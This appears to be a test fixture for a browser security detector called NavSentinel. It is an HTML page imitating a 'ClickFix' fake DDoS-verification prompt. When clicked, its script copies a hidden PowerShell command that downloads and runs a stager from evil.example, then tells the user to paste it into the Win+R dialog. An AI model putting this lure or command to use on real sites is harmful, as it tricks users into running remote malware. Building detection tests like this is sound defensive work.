@@ -1,0 +1,179 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ClickFix 04 - Win+R Instruction Variant</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+      background: #0d1117;
+      color: #c9d1d9;
+    }
+    h1 { margin-top: 0; color: #fff; }
+    .description {
+      background: rgba(255, 243, 205, 0.1);
+      border: 1px solid #ffc107;
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      color: #ffc107;
+    }
+
+    /* Fake DDoS protection overlay */
+    #ddos-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(13, 17, 23, 0.95);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #ddos-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 40px;
+      width: 460px;
+      text-align: center;
+    }
+    #ddos-box .shield-icon {
+      font-size: 56px;
+      margin-bottom: 12px;
+    }
+    #ddos-box h2 {
+      color: #58a6ff;
+      margin-top: 0;
+      font-size: 22px;
+    }
+    #ddos-box p {
+      color: #8b949e;
+      line-height: 1.5;
+      font-size: 14px;
+    }
+    #ddos-box .verify-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 24px 0;
+      padding: 14px;
+      border: 2px solid #30363d;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: border-color 0.2s;
+    }
+    #ddos-box .verify-row:hover {
+      border-color: #58a6ff;
+    }
+    #ddos-box .fake-checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #484f58;
+      border-radius: 3px;
+      flex-shrink: 0;
+    }
+    .win-r-steps {
+      text-align: left;
+      margin-top: 20px;
+      padding: 16px;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      font-size: 14px;
+      display: none;
+    }
+    .win-r-steps li {
+      margin: 10px 0;
+      color: #c9d1d9;
+    }
+    .win-r-steps kbd {
+      background: #21262d;
+      border: 1px solid #30363d;
+      border-radius: 3px;
+      padding: 2px 6px;
+      font-family: ui-monospace, monospace;
+      font-size: 13px;
+      color: #f0f6fc;
+    }
+
+    #status {
+      margin-top: 16px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      background: rgba(255,255,255,0.05);
+    }
+    .status-triggered { background: rgba(46, 160, 67, 0.15) !important; color: #3fb950; }
+  </style>
+</head>
+<body>
+  <h1>ClickFix 04 - Win+R Instruction Variant</h1>
+  <div class="description">
+    <strong>Attack scenario:</strong> A fake DDoS protection page writes a malicious
+    command to the clipboard when the user clicks "verify". It then shows Win+R
+    paste instructions. This variant specifically tells the user to press Win+R
+    (Windows Run dialog) and paste the command.
+    <br><br>
+    <strong>Expected:</strong> NavSentinel detects the ClickFix pattern: clipboard
+    write with command-like content + overlay + Win+R instruction text.
+  </div>
+
+  <div id="ddos-overlay">
+    <div id="ddos-box">
+      <div class="shield-icon">&#x1F6E1;</div>
+      <h2>DDoS Protection</h2>
+      <p>Checking your browser before accessing the site.<br>This process is automatic.</p>
+
+      <div class="verify-row" id="verify-btn">
+        <div class="fake-checkbox" id="checkbox-icon"></div>
+        <span>Verify you are human</span>
+      </div>
+
+      <div class="win-r-steps" id="steps-section">
+        <strong style="color: #58a6ff;">Complete verification:</strong>
+        <ol>
+          <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</li>
+          <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the verification token</li>
+          <li>Press <kbd>Enter</kbd> to complete verification</li>
+        </ol>
+        <p style="font-size:12px;color:#484f58;">This verification expires in 60 seconds.</p>
+      </div>
+    </div>
+  </div>
+
+  <div id="status">Status: Waiting for user to click verify...</div>
+
+  <script>
+    var verifyBtn = document.getElementById("verify-btn");
+    var checkboxIcon = document.getElementById("checkbox-icon");
+    var stepsSection = document.getElementById("steps-section");
+    var statusEl = document.getElementById("status");
+
+    verifyBtn.addEventListener("click", function() {
+      // Malicious command targeting Windows Run dialog
+      var fakeCommand = 'powershell -w hidden -ep bypass -c "IEX(IWR https://evil.example/stager.ps1)"';
+
+      navigator.clipboard.writeText(fakeCommand).then(function() {
+        checkboxIcon.style.background = "#238636";
+        checkboxIcon.innerHTML = "&#10003;";
+        checkboxIcon.style.color = "#fff";
+        checkboxIcon.style.textAlign = "center";
+        checkboxIcon.style.lineHeight = "22px";
+        checkboxIcon.style.fontSize = "14px";
+        stepsSection.style.display = "block";
+
+        statusEl.textContent = "Status: Clipboard write + Win+R instructions shown. NavSentinel should alert.";
+        statusEl.className = "status-triggered";
+      }).catch(function(err) {
+        statusEl.textContent = "Status: Clipboard write failed: " + err.message;
+      });
+    });
+  </script>
+</body>
+</html>
